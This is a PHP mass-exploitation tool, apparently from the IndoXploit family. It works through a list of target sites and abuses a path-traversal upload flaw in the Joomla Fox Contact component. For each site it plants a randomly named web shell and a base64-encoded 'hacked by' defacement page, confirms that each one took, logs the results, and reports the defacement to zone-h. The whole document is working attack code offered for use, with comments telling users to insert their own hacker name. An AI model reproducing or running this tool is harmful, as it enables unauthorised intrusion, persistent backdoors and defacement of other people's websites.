pcUNucy9TVkpMZGpJSEhJRmYyU0J1RGlxd1hreUZBeEpaZGdhbW9CNmpGVVRIZHdmV09UMFpKQUI4VzdJUU5pTVZjdGxhU3BJMVRIS3FrK21hbXJkUlRwMXhWUWJUN3BMWmJwaHloT3lzRFVFbkZWTW05U0FNUXdoclFNZWxldlhGVlI3eFhFQlplVXNZcHlIdzk5aHRURlVUcUVybEZsRXpDNlExa0ZBRkZlbEQxUHZpcXJmM04xY1dLTktnWW9GQWFnQjRyWHRYdmlycis0dHpweStqYjhGY2NYQkJIRit1OUtDcC9aeFZiYXc2V0xlWGk3dEk4VzFWQUt0WGZ2K09Lb2F3MCszbmI5N01FU3BCUGZZVjZkY1ZVbHM3azNMeDI2bVJrL2FqM29QSEZWTzZ0NUlTb2R1UllCdGpYcjhzVlh5QzhqZ0hxRGloQW9wMkpIWTRxcFc4MHNacENENmhJb3kxcnNjVldNN2VvV2tGV0pQSUh4OThWYm1tYVdRdTNVN25GVnRSeG9CdWVweFZ0Qkh1V0o2R2c4VGlxekZYWXEzaXJXS3V4VjJLdXhWMkt1eFYyS3V4VjJLdXhWMkt1eFYyS3V4VjJLdXhWMkt1eFYvL1M4cVlxN0ZYWXE3RlhZcTdGWFlxN0ZYWXFpN09SZUVzVENwZGZnLzFzVlh3U3Q2TVpVZnZZR0xWOFI0SEZWUjVJL2dZdHRQUmd4SDJXQnhWWE1rOEVvZTNVb0ZmaTZEZmM3N1Y4Y1ZhQ1dNN1N5TXU1Ym5zYUhqU2hBK1J4VkJ5V01zY1AxbGlHakpvbzZrMTJ4VlNTZWVONmxtSFk3K0dLcXlYanRDOGJGbGdMY2dGT3lrNHFqUHJzbHpGR2pLa2lweDVKV25JanJ0L01SaXFsYy9VNWZTS2hvb0ExQ3dBb0EzODFNVldYbGtpQkZpUEp5ZmhQS3ZJRTdVcVB4eFZaY0M5dDBqV1FsV1pDb1RjRUtUVWdqM3hWY3Q3UEJhaFY1ZWxJZVFEN3FXR3hQNDRxcHhYTVJqa1Y0NnM5TnhUNFFEV3FqeHhWWDA3NnVKSFpaV2lDaHFQV2gveVNldUtxTnVySktIZ2w1T0c3VkFJcnZ5UGJGVitweDNDWG5vdFRtQ0tLaERBRWdVRlIxYitiRlZ0eE5mendxMGdiMGtIQUVDZytIclg1WXFvMjF6NklQRmYzaCt5OWVtS3JJNUZNL09VY3dUVnVSSXI5MktyWkpPZE5nQU9tS3R5R01xdkJhRUQ0aVRXcHhWWUFLSGY1REZYVXhWckZYWXE3RlhZcTdGWFlxN0ZYWXE3RlhZcTdGWFlxN0ZYWXE3RlhZcTdGWFlxN0ZYWXEvd0QvMC9LdUt0WXEyUlRGV3NWZGlyc1ZkaXJzVmRpcXRiU0dPVlhBQkFZVitYaGlxSWtLd1RzNkFCWEd5MTZWR0tybFFRRXhUL0drcTFTbmF1K0txaXpTS0hoY0VUa3FZbS9tcDIzeFZ1YTBEZXRLRFNTTGN4OU51NUZSMHJpcUhGNUtJR2lJS1F5RU5RZENSME8rS3EzcWlka1psRW5vL0U0RkZxdmV2dmlxMldDenVMaUZJbkVQSUVPRzZBMTIzOXhpcXlTeW5Fc2tVUHhKRWZpWWRSWGJmRlZKWjdnUk5ISFVwVDRxZEtZcXFQTmJ0QnhZbjFGM1JsL0FZcWlyclVKcmdRVGNrRHcwV3BPN1VIVWcvd0FNVmRxbHhheXhROEUyWHZzS0w0YlV4VlV1cld3VFNrbWlmZHZzbHExYXZnTndDUDJ0L3dEZ3NWUTBla0UyMzFneXFZMkRGQXZpcHA4dm94VkN3VzkwekJZa0o1ZEtkRHhPS3VuTnhGT0RMVU90Q0tmaFRGVVRkMzByV3FXNWg5S01BQlNkelRyMTl6aXFIZ21oampQd24xVHR6SFlIcU1WV1c2eHZLUFZOSXdhdDJKSGdNVmFuQ2VxM0NuR3V3RzRIc0RpcXhnQlR4NzRxMTJ4VjJLdFlxN0ZYWXE3RlhZcTdGWFlxN0ZYWXE3RlhZcTdGWFlxN0ZYWXE3RlhZcTdGWFlxN0ZYLy9VOHFZcTdGWFlxN0ZYWXE3RlhZcTdGWFlxdVNwYWdJRmU1eFZHZkZjV3BCLzQ5MEhIeHBYZkZYVzVnbGhmMUc0dEdBVjdrMDJvTVZWVmVUVUNnSkhxUUx0VFlrTGlyUXVoY09GZGlybFNwTmFmajhzVldTRi9xd2dsQm9tOFo4UVRpcXlXMlFpSXdOL2VWREFubzNoaXFuSXMxdXhpY2I5VC9YRlZhMzFDV0NaWll5Uk1RVmRtNkVIRlZTTzZQN3dWVnhJSzhxbFNwUFVkdVdLcWNTV3dpZEpGcE9WK0VucDFydFRGV3hwNmZVUmNyS0djbjRGb1JzUHRkZkRGV3A0OVJqaEptRkl3YUdwQnIvblhGWEpkUlBDMGN5clZxa0VnL0NhZFJUeDJHS3ExdTBpMkR4cTRFVDBZQmpYNHh0VWIvQ2NWVzJJdXd2cEtmVWliNGhIV281ZEs0cW9TWFhLNER5UmdoS2dyMHIyM3hWZGUzYlNLc1lVcWlnQ2hOUlViMUhZWXFwcmNScmJ0RXFidUFISm9kd2VvUGJGVkZRaFZpeG9SMHhWYU92Z1BIRlhNQUdJQnFPeHhWeEJ4VnJGWFlxN0ZYWXE3RlhZcTdGWFlxN0ZYWXE3RlhZcTdGWFlxN0ZYWXE3RlhZcTdGWFlxN0ZYLy8xZkttS3V4VjJLdXhWMkt1eFYyS3V4VjJLdDRxaVltNE92eEJ4SUtPQjJGZStLdW5wQmRHbEN0UVNCMDhhWXFxeXEzcnRQYmlzUzcxSFNoSGY3OFZYU3JGY3h4TkcxSkZXajFGQjhQUWUrS3JQclZFTUV3QkNzQ0dwNFlxc21FUlpHaG9nYzEzT3c5c1ZYdk5jUlNySk9heTA2SGNNcDdIdGlyUWEya21aM1Q0SkJVQmRpckQrR0tyQmFnd1BOR3hKUnFjZjhuc2NWV2tYTUxDUmxvelVaU1FDZCtoR0txcHVHb2ZWU2dadWZEY1ZxS1ZHS3FpWFVrbHI2UmMwQitCVHVLRC9PbUt0M1JobHRJM1NQaVYvdkZGYUN2aDg4VmRkNmZCREI2aVMrcUhvWStJTkJYOWtuRlZscmNYMEtjVVUwanIxSkZPVzN0aXFsQmNCWkZlV2pMV3BRamJGVitwWGNWeE55aUZFQTZVQTdBZEJpcWs2d0MyVXE0TG5xS2IxT0t0UTIvSkRJNTR4Z0hjYm1vNkNtS3FKQTdiNHE3RldzVmRpcnNWZGlyc1ZkaXJzVmRpcnNWZGlyc1ZkaXJzVmRpcnNWZGlyc1ZkaXJzVmRpcnNWZGlyLzlieXBpcnNWZGlyc1ZkaXJzVmRpcnNWZGlyc1ZWN2NvQ1drSkFwdFFWM0hURlY0VlpVZmY0NmcxT3czT0tyWXBYZzlTTnFyeUhFL2ZpcStaR2dsNXhmRkdhRlNPbSs5TVZWYkkyazB6cE1hQng4REhjaHZvN1lxb3BiUHhMSTZrcVNyS1R2aXFtSldWaHY4U0g0VDEzeFZjWFI1dlVrRkFmdGNkdC9HbUt1QkJrSWphZzZpdjZzVlgrcVdnNHRVOE5scnZ4OEtIRlVSNjlyY3pJMXd1d1hpU0RUZnNjVmNMUzBra2xZUzFWZUpSZkVFVVAwcmlxR2tXZUtKVmF2Q25TdTFHOXNWVkduRWxvc1JIQXExUXdyVGZxZXVLb21lNHVqWitwSUJLaDJXUWo2SzA4ZjhyRlVIYXRaaFdlWlhhWlNDcWluQWp2WEZWSWoxYmdyR0Fna2FnRmRoWCtHS3RUUnhvZUt0eVlWNUhvSysyS3FmYkZYWXExaXJzVmRpcnNWZGlyc1ZkaXJzVmRpcnNWZGlyc1ZkaXJzVmRpcnNWZGlyc1ZkaXJzVmRpcnNWZGlyL0FQL1g4cVlxN0ZYWXE3RlhZcTdGWFlxN0ZYWXE3RlZTUDFOK1BUdmlxNDgvRTE3MXhWRlh4Vm5CbkFXVGlwQUg0amF1S3QyVGxXSDFpTXZDVkFVZzBJMzJPM2ZGVU02cjZoWkhISWs4a0lOUnY0NHEzYmx2VVhrTys5S2NzVlhUQi9yaitnV1BoeXBXbE1WVUpPWEw0dXZldjl1S3VTdEFEMDdId3hWZkg2dkdUalVqOXM0cXNTbkVnN2UrS3FrSUZGNHNlVmZBL2hURlV6WWdtQmRRRklnaDlPUWRhZGl3eFZBVGNRMGd0aUREWFp2OXZlbnp4VlZoYS9GbXl4cURBYThuMm9CVGVnSisvRldvMXNoQ3pUc0RLUlFKdUNEWHhBSXhWQk9GRGtLMVZyczFDTVZXbkZXc1ZkaXJzVmRpcnNWZGlyc1ZkaXJzVmRpcnNWZGlyc1ZkaXJzVmRpcnNWZGlyc1ZkaXJzVmRpcnNWZGlyc1ZmL1oiPg0KPGRpdiBzdHlsZT0nY29sb3I6d2hpdGU7Zm9udC1zaXplOjUwcHg7dGV4dC1hbGlnbjpjZW50ZXI7cGFkZGluZzowcHg7Jz5bIV0gaGFja2VkIGJ5IHBhdGFuNDA0PC9kaXY+DQo=';

		 

	public function __construct() {
		$this->file = (object) $this->file;

		/* Nama file deface kalian */
		$this->file->deface 	= "id.htm";

		$this->file->shell 		= $this->randomFileName().".php";

		/* Nick Hacker Kalian / Nick Zone -H Kalian */
		/* Pastikan dalam script deface kalian terdapat kata HACKED */
		$this->hacker  = "Patan404"; 
	}

	public function validUrl() {
		if(!preg_match("/^http:\/\//", $this->url) AND !preg_match("/^https:\/\//", $this->url)) {
			$url = "http://".$this->url;
			return $url;
		} else {
			return $this->url;
		}
	}

	public function randomFileName() {
		$characters = implode("", range(0,9)).implode("", range("A","Z")).implode("", range("a","z"));
		$generate   = substr(str_shuffle($characters), 0, rand(4, 8));

		$prefixFilename = "\x69\x6e\x64\x6f\x78\x70\x6c\x6f\x69\x74"."_";
		return $prefixFilename.$generate;
	}

	public function curl($url, $data = null, $headers = null, $cookie = true) {
		$ch = curl_init();
			  curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
			  curl_setopt($ch, CURLOPT_URL, $url);
			  curl_setopt($ch, CURLOPT_USERAGENT, "IndoXploitTools/1.1");
			  //curl_setopt($ch, CURLOPT_VERBOSE, TRUE);
			  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
			  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
			  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
			  curl_setopt($ch, CURLOPT_TIMEOUT, 5);

		if($data !== null) {
			  curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
			  curl_setopt($ch, CURLOPT_POST, TRUE);
			  curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
		}

		if($headers !== null) {
			  curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
		}

		if($cookie === true) {
			  curl_setopt($ch, CURLOPT_COOKIE, TRUE);
			  curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie.txt");
			  curl_setopt($ch, CURLOPT_COOKIEJAR, "cookie.txt");
		}

		$exec = curl_exec($ch);
		$info = curl_getinfo($ch);

			  curl_close($ch);

		return (object) [
			"response" 	=> $exec,
			"info"		=> $info
		];

	}

	public function getId() {
		$url 		= $this->url;
		$getContent = $this->curl($url)->response;
		preg_match_all("/<a name=\"cid_(.*?)\">/", $getContent, $cid);
		preg_match_all("/<a name=\"mid_(.*?)\">/", $getContent, $mid);

		return (object) [
			"cid" => ($cid[1][0] === NULL ? 0 : $cid[1][0]),
			"mid" => ($mid[1][0] === NULL ? 0 : $mid[1][0]),
		];
	}

	public function exploit() {
		$getCid = $this->getId()->cid;
		$getMid = $this->getId()->mid;

		$url	= (object) parse_url($this->url);

		$headers = [
			"X-Requested-With: XMLHttpRequest",
			"X-File-Name: ".$this->file->shell,
			"Content-Type: image/jpeg"
		];

		$vuln 	= [
			$url->scheme."://".$url->host."/components/com_foxcontact/lib/file-uploader.php?cid=".$getCid."&mid=".$getMid."&qqfile=/../../".$this->file->shell,
			$url->scheme."://".$url->host."/index.php?option=com_foxcontact&view=loader&type=uploader&owner=component&id=".$getCid."?cid=".$getCid."&mid=".$getMid."&qqfile=/../../".$this->file->shell,
			$url->scheme."://".$url->host."/index.php?option=com_foxcontact&view=loader&type=uploader&owner=module&id=".$getCid."?cid=".$getCid."&mid=".$getMid."&qqfile=/../../".$this->file->shell,
			$url->scheme."://".$url->host."/components/com_foxcontact/lib/uploader.php?cid=".$getCid."&mid=".$getMid."&qqfile=/../../".$this->file->shell,
		];

		foreach($vuln as $v) {
			$this->curl($v, base64_decode($this->uploader), $headers);
		}

		$shell = $url->scheme."://".$url->host."/components/com_foxcontact/".$this->file->shell;
		$check = $this->curl($shell)->response;
		if(preg_match("/Uploader By IndoXploit BOT/i", $check)) {
			print "[+] Shell OK: ".$shell."\n";
			$this->save($shell);
		} else {
			print "[-] Shell Failed\n";
		}
		
		$vuln 	= [
			$url->scheme."://".$url->host."/components/com_foxcontact/lib/file-uploader.php?cid=".$getCid."&mid=".$getMid."&qqfile=/../../../../".$this->file->deface,
			$url->scheme."://".$url->host."/index.php?option=com_foxcontact&view=loader&type=uploader&owner=component&id=".$getCid."?cid=".$getCid."&mid=".$getMid."&qqfile=/../../../../".$this->file->deface,
			$url->scheme."://".$url->host."/index.php?option=com_foxcontact&view=loader&type=uploader&owner=module&id=".$getCid."?cid=".$getCid."&mid=".$getMid."&qqfile=/../../../../".$this->file->deface,
			$url->scheme."://".$url->host."/components/com_foxcontact/lib/uploader.php?cid=".$getCid."&mid=".$getMid."&qqfile=/../../../../".$this->file->deface,
		];

		foreach($vuln as $v) {
			$this->curl($v, base64_decode($this->deface), $headers);
		}

		$deface = $url->scheme."://".$url->host."/".$this->file->deface;
		$check = $this->curl($deface)->response;
		if(preg_match("/hacked/i", $check)) {
			print "[+] Deface OK: ".$deface."\n";
			$this->zoneh($deface);
			$this->save($deface);
		} else {
			print "[-] Deface Failed\n";
		}
	}

	public function zoneh($url) {
		$post = $this->curl("http://www.zone-h.com/notify/single", "defacer=".$this->hacker."&domain1=$url&hackmode=1&reason=1&submit=Send",null,false);

		if(preg_match("/color=\"red\">OK<\/font><\/li>/i", $post->response)) {
			print "[+] Zone-H ($url) [OK]\n\n";
		} else {
			print "[+] Zone-H ($url) [ERROR]\n\n";
		}
	}

	public function save($isi) {
		$handle = fopen("result_foxcontact.txt", "a+");
		fwrite($handle, "$isi\n");
		fclose($handle);
	}
} 	

if(!isset($argv[1])) die("!! Usage: php ".$argv[0]." target.txt");
if(!file_exists($argv[1])) die("!! File target ".$argv[1]." tidak di temukan!!");
$open = explode("\n", file_get_contents($argv[1]));

foreach($open as $list) {
	$fox = new IDX_Foxcontact();
	$fox->url = trim($list);
	$fox->url = $fox->validUrl();
	print "[+] Exploiting ".parse_url($fox->url, PHP_URL_HOST)."\n";
	$fox->exploit();
}